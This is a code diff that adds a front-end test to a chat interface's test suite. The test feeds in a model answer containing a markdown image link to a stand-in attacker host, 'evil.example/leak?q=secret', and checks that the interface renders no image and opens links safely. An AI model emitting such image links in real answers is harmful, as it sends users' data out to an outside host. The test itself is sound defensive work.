@@ -622,4 +622,20 @@ describe('ChatLayout', () => {
     await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith('plan.pdf was removed before it was read.', 'info'))
     expect(addToast).not.toHaveBeenCalledWith('No such document.', 'error')
   })
+
+  it('loads no image an answer names, and opens its links in a new tab (S3)', async () => {
+    // Model output is untrusted: an image URL could carry text out, and a link in the same tab
+    // would end the session held in memory
+    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
+      onToken?.('See ![chart](https://evil.example/leak?q=secret) and [the manual](https://example.com/manual).')
+      onDone?.(done({ sources: [SOURCE], confidence: 0.8, turn_id: 50 }))
+    })
+    renderChat()
+    await ask('Show me')
+    const link = await screen.findByRole('link', { name: 'the manual' })
+    expect(link.getAttribute('target')).toBe('_blank')
+    expect(link.getAttribute('rel')).toBe('noopener noreferrer')
+    expect(document.querySelector('img')).toBeNull()
+    expect(document.body.innerHTML).not.toContain('evil.example')
+  })
 })
